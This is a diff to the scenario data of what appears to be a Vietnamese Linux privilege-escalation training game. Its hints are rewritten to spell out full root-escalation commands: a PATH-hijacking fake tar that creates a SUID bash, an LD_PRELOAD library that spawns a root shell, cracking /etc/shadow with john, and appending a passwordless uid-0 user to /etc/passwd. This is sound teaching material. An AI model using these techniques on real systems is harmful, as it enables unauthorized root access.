@@ -192,8 +192,8 @@ export default [
     ],
     hints: [
       'Một script được root chạy tự động đang gọi lệnh hệ thống bằng tên trần, không phải đường dẫn đầy đủ.',
-      'Đọc `cat /opt/backup.sh` — nó gọi `tar` không có `/bin/` hay `/usr/bin/` phía trước. Tạo `/tmp/tar` chứa payload và `chmod +x` nó.',
-      '`export PATH=/tmp:$PATH` rồi đợi cron chạy; khi root thực thi script, shell tra PATH theo thứ tự và tìm /tmp/tar TRƯỚC /usr/bin/tar thật. Sau khi có /tmp/rootbash SUID, chạy `/tmp/rootbash -p` rồi `cat /root/flag.txt`.',
+      'Đọc `cat /opt/backup.sh` — nó gọi `tar` không có `/bin/` hay `/usr/bin/` phía trước. Tạo binary giả: `echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /tmp/tar` rồi `chmod +x /tmp/tar`.',
+      '`export PATH=/tmp:$PATH` rồi đợi cron chạy: `crontab -l` xác nhận lịch, hoặc đơn giản `sleep 300` để chờ. Khi root thực thi script, shell tra PATH theo thứ tự và tìm /tmp/tar TRƯỚC /usr/bin/tar thật. Sau khi có /tmp/rootbash SUID, chạy `/tmp/rootbash -p` rồi `cat /root/flag.txt`.',
     ],
     debrief: [
       'PATH là danh sách thư mục shell tra theo THỨ TỰ để tìm binary khi gọi bằng tên trần — thư mục nào đứng trước được ưu tiên, dù ai đặt nó vào PATH cũng có quyền chi phối lệnh nào thực sự chạy.',
@@ -240,7 +240,7 @@ export default [
     hints: [
       'Đọc được /etc/shadow là jackpot — nó chứa hash, không phải password trần, nên còn một bước crack offline nữa.',
       'Dùng `cat /etc/shadow` để xác nhận đọc được, rồi `unshadow /etc/passwd /etc/shadow > crack.txt` để gộp 2 file thành format john hiểu.',
-      'Chạy `john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt` — tài khoản `svc` sẽ crack ra `password123` trong vài giây vì đó là mật khẩu yếu kinh điển.',
+      'Chạy `john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt` — tài khoản `svc` sẽ crack ra `password123` trong vài giây vì đó là mật khẩu yếu kinh điển. Đăng nhập bằng `su svc` (password `password123`).',
     ],
     debrief: [
       '/etc/passwd chứa thông tin user (uid, shell, home) công khai cho mọi tiến trình đọc; /etc/shadow chứa HASH mật khẩu và chỉ root đọc được — đọc được file này nghĩa là kiểm soát truy cập đã bị bypass ở đâu đó.',
@@ -345,8 +345,8 @@ export default [
       { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
     ],
     hints: [
-      'sudo -l cho phép `cp` với dấu `*` ở CUỐI lệnh — dấu hoa thị đó nghĩa là đích copy do MÀY chọn, không bị giới hạn.',
-      'Tạo một file passwd giả trong /var/backups (thư mục được phép làm nguồn), thêm dòng user uid 0 không password, ví dụ `pwned::0:0::/root:/bin/bash`.',
+      'Chạy `sudo -l` — nó cho phép `cp` với dấu `*` ở CUỐI lệnh — dấu hoa thị đó nghĩa là đích copy do MÀY chọn, không bị giới hạn.',
+      'Gõ `cat /etc/passwd` để biết format dòng hiện tại, rồi tạo một file passwd giả trong /var/backups (thư mục được phép làm nguồn): `echo "pwned::0:0::/root:/bin/bash" > /var/backups/passwd`.',
       'Chạy `sudo cp /var/backups/passwd /etc/passwd` để ghi đè bằng quyền root, rồi `su pwned` (không cần password vì field hash rỗng) và `cat /root/flag.txt`.',
     ],
     debrief: [
@@ -444,7 +444,7 @@ export default [
     ],
     hints: [
       'Không phải binary được phép chạy có vấn đề — mà là một biến môi trường được sudo GIỮ LẠI thay vì xoá.',
-      '`sudo -l` cho thấy `env_keep += "LD_PRELOAD"`. Viết một file .c có hàm constructor gọi `setuid(0); system("/bin/bash");`, rồi compile bằng `gcc -shared -fPIC -o preload.so preload.c`.',
+      '`sudo -l` cho thấy `env_keep += "LD_PRELOAD"`. Viết file .c có hàm constructor gọi setuid+system: `echo \'void _init() { setuid(0); system("/bin/bash"); }\' > /tmp/preload.c`, rồi compile bằng `gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c`.',
       'Chạy `sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find` — `.so` được nạp và chạy code TRƯỚC khi find thực thi, trong khi sudo còn đang giữ quyền root. Sau đó `cat /root/flag.txt`.',
     ],
     debrief: [
@@ -484,7 +484,7 @@ export default [
       { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
     ],
     hints: [
-      'SUID sạch không nghĩa là hết đường — Linux có một cơ chế cấp quyền khác mà `find -perm` KHÔNG bắt được.',
+      'Xác nhận lại bằng `find / -perm -4000 2>/dev/null` — SUID sạch không nghĩa là hết đường, Linux có một cơ chế cấp quyền khác mà lệnh này KHÔNG bắt được.',
       'Dùng `getcap -r /` để quét capability gắn trên file, khác hẳn lệnh tìm SUID.',
       'Kết quả báo `python3.9 = cap_setuid+ep`. Khai thác giống GTFOBins entry "Capabilities": `python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'` rồi `cat /root/flag.txt`.',
     ],
@@ -522,7 +522,7 @@ export default [
     ],
     hints: [
       'Trước khi nghĩ tới exploit, luôn kiểm tra quyền của chính các file hệ thống nhạy cảm.',
-      'Dùng `ls -l /etc/passwd` — nếu thấy `rw-rw-rw-` (mọi nhóm đều ghi được), mày không cần khai thác gì cả.',
+      'Dùng `ls -l /etc/passwd` — nếu thấy `rw-rw-rw-` (mọi nhóm đều ghi được), mày không cần khai thác gì cả. Gõ `cat /etc/passwd` để biết format dòng hiện tại.',
       'Append một dòng mới bằng `echo "pwned::0:0::/root:/bin/bash" >> /etc/passwd` (field 2 rỗng = không password), rồi `su pwned` và `cat /root/flag.txt`.',
     ],
     debrief: [
@@ -712,7 +712,7 @@ export default [
       { id: 'read_flag', description: 'Đọc flag tốt nghiệp trong /root', match: /^cat\s+\/root\/flag\.txt/ },
     ],
     hints: [
-      'Chạy đủ bộ enum (id, sudo -l, uname -a, /etc/passwd, SUID) trước khi quyết định bất cứ điều gì — đừng exploit thứ đầu tiên thấy.',
+      'Chạy đủ bộ enum trước khi quyết định bất cứ điều gì — đừng exploit thứ đầu tiên thấy: `id`, `sudo -l`, `uname -a`, `cat /etc/passwd`, `find / -perm -4000 2>/dev/null`.',
       'SUID list có `base64` — khai thác được qua GTFOBins nhưng đó là đường VÒNG. Nhìn lại `sudo -l`: có dòng NOPASSWD cho cả `/bin/bash` luôn — đây mới là đường thẳng.',
       'Bỏ qua base64, gõ trực tiếp `sudo /bin/bash` để có root shell ngay lập tức, rồi `cat /root/flag.txt`.',
     ],
